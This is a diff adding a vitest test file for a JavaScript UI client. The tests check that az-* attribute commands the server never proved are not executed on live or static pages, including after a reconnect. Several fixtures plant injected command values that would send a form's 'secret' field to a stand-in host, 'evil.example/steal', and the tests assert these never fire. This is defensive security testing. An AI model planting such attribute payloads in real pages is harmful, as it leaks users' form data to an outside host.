@@ -1,0 +1,206 @@
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
+
+// A command runs only under an `az-*` name the server proved to carry commands
+// (the compile-time and render-time proofs `arizona_event_attrs` delivers). A
+// static value under any other name is app data, possibly user-influenced, and
+// `[0,"x"]` is a structurally valid command list, so no executor may parse one:
+// not the delegated listeners, not the dedicated submit and drop listeners, not
+// the reconnect replay.
+
+/** A module instance with no delegation history: the proven set is module state. */
+async function fresh() {
+    vi.resetModules();
+    return await import('./arizona.js');
+}
+
+/** Drive a module instance through a mocked Worker, exposing what it sent. */
+function mockWorker(/** @type {any} */ mod) {
+    /** @type {any[]} */
+    const posted = [];
+    /** @type {any} */
+    let onmsg = null;
+    const inst = {
+        postMessage: (/** @type {any} */ d) => posted.push(d),
+        set onmessage(fn) {
+            onmsg = fn;
+        },
+        get onmessage() {
+            return onmsg;
+        },
+        terminate: vi.fn(),
+    };
+    const Orig = globalThis.Worker;
+    globalThis.Worker = /** @type {any} */ (
+        function () {
+            return inst;
+        }
+    );
+    const disconnect = mod.connect('/ws');
+    const frame = (/** @type {any[]} */ data) => inst.onmessage({ data });
+    return {
+        open: (reconnect = false) => frame([1, reconnect]),
+        /** A frame carrying `names` as its proven set. */
+        names: (/** @type {string[]} */ names) => frame([0, null, null, false, names, null]),
+        resync: (/** @type {any[]} */ ops) => frame([0, ops, null, true, null, null]),
+        close: (code = 1006) => frame([2, code]),
+        sent: () => posted.filter((d) => d[0] === 1).map((d) => JSON.parse(d[1])),
+        restore: () => {
+            disconnect();
+            globalThis.Worker = Orig;
+        },
+    };
+}
+
+const EVIL = 'https://evil.example/steal';
+
+/** @type {ReturnType<typeof mockWorker> | null} */
+let w = null;
+/** @type {any} */
+let fetchSpy;
+
+beforeEach(() => {
+    document.body.innerHTML = '';
+    fetchSpy = vi
+        .spyOn(globalThis, 'fetch')
+        .mockImplementation(() => Promise.resolve(new Response('{}')));
+});
+
+afterEach(() => {
+    w?.restore();
+    w = null;
+    vi.restoreAllMocks();
+    document.body.innerHTML = '';
+});
+
+// The types the client used to delegate before any proof arrived.
+const COMMON = [
+    ['click', true],
+    ['change', true],
+    ['input', true],
+    ['keydown', true],
+    ['keyup', true],
+    ['focusin', true],
+    ['focusout', true],
+];
+
+describe('an unproven az-* value is data on a live page', () => {
+    for (const [type, bubbles] of COMMON) {
+        it(`does not run az-${type} the server never proved`, async () => {
+            const mod = await fresh();
+            document.body.innerHTML =
+                `<div id="v" az-view><form id="f">` +
+                `<input id="i" name="secret" value="hunter2" az-${type}='[0,"evil_${type}",{"x":1}]'>` +
+                `</form></div>`;
+            w = mockWorker(mod);
+            w.open();
+            w.names(['az-submit']);
+            document.getElementById('i').dispatchEvent(new Event(type, { bubbles }));
+            expect(w.sent()).toEqual([]);
+        });
+    }
+
+    it('does not fetch another origin from an unproven az-change', async () => {
+        const mod = await fresh();
+        document.body.innerHTML =
+            `<div id="v" az-view><form id="f" az-change='[22,"${EVIL}",{}]'>` +
+            `<input id="i" name="secret" value="hunter2"></form></div>`;
+        w = mockWorker(mod);
+        w.open();
+        w.names(['az-submit']);
+        document.getElementById('i').dispatchEvent(new Event('change', { bubbles: true }));
+        expect(fetchSpy).not.toHaveBeenCalled();
+    });
+
+    it('still runs the same value once its name is proven', async () => {
+        const mod = await fresh();
+        document.body.innerHTML = `<div id="v" az-view><button id="b" az-click='[0,"inc"]'>+</button></div>`;
+        w = mockWorker(mod);
+        w.open();
+        w.names(['az-click']);
+        document.getElementById('b').click();
+        expect(w.sent()).toEqual([['v', 'inc', {}]]);
+    });
+
+    it('does not run an unproven az-submit, before or after the socket opens', async () => {
+        const mod = await fresh();
+        document.body.innerHTML =
+            `<div id="v" az-view><form id="f" az-submit='[22,"${EVIL}",{}]'>` +
+            `<input name="secret" value="hunter2"></form></div>`;
+        w = mockWorker(mod);
+        const form = /** @type {HTMLFormElement} */ (document.getElementById('f'));
+        // Before the open: a fetch needs no socket, so this is the HTTP-form path.
+        const pre = new Event('submit', { bubbles: true, cancelable: true });
+        form.dispatchEvent(pre);
+        w.open();
+        w.names(['az-click']);
+        const post = new Event('submit', { bubbles: true, cancelable: true });
+        form.dispatchEvent(post);
+        expect(fetchSpy).not.toHaveBeenCalled();
+        // Still never submitted natively: that would put the fields in the URL.
+        expect(pre.defaultPrevented).toBe(true);
+        expect(post.defaultPrevented).toBe(true);
+    });
+
+    it('does not run an unproven az-drop', async () => {
+        const mod = await fresh();
+        document.body.innerHTML =
+            `<div id="v" az-view><ul id="l" az-drop='[0,"evil_drop"]'>` +
+            `<li id="a" az-key="a" draggable="true">a</li></ul></div>`;
+        w = mockWorker(mod);
+        w.open();
+        w.names(['az-click']);
+        const start = new Event('dragstart', { bubbles: true });
+        Object.defineProperty(start, 'dataTransfer', { value: { setData: () => {} } });
+        document.getElementById('a').dispatchEvent(start);
+        const drop = new Event('drop', { bubbles: true, cancelable: true });
+        Object.defineProperty(drop, 'dataTransfer', { value: { getData: () => 'a' } });
+        document.getElementById('a').dispatchEvent(drop);
+        expect(w.sent()).toEqual([]);
+    });
+
+    it("does not replay a form's unproven az-change after a reconnect", async () => {
+        const mod = await fresh();
+        const view =
+            `<div id="v" az-view><form id="f" az-change='[22,"${EVIL}",{}]'>` +
+            `<input name="secret" value=""></form></div>`;
+        document.body.innerHTML = view;
+        w = mockWorker(mod);
+        w.open();
+        w.names(['az-click']);
+        /** @type {HTMLInputElement} */ (document.querySelector('input')).value = 'hunter2';
+        w.close();
+        w.open(true);
+        w.resync([[8, 'v', view]]);
+        expect(fetchSpy).not.toHaveBeenCalled();
+    });
+
+    it("does not replay a server-owned field's unproven az-input after a reconnect", async () => {
+        const mod = await fresh();
+        const view =
+            `<div id="v" az-view>` +
+            `<input id="q" name="q" value="" az-ctl="value" az-input='[0,"evil_input"]'></div>`;
+        document.body.innerHTML = view;
+        w = mockWorker(mod);
+        w.open();
+        w.names(['az-click']);
+        /** @type {HTMLInputElement} */ (document.getElementById('q')).value = 'typed';
+        w.close();
+        w.open(true);
+        w.resync([[8, 'v', view]]);
+        expect(w.sent().filter((f) => f[1] === 'evil_input')).toEqual([]);
+    });
+});
+
+describe('an unproven az-* value is data on a static page', () => {
+    it('does not run az-click the page did not embed', async () => {
+        vi.resetModules();
+        const mod = await import('./arizona-static.js');
+        document.body.innerHTML =
+            `<div id="v" az-view><form>` +
+            `<button id="b" type="button" az-click='[22,"${EVIL}",{}]'>x</button></form></div>`;
+        const stop = mod.start({ attrs: ['az-dblclick'] });
+        document.getElementById('b').click();
+        stop();
+        expect(fetchSpy).not.toHaveBeenCalled();
+    });
+});
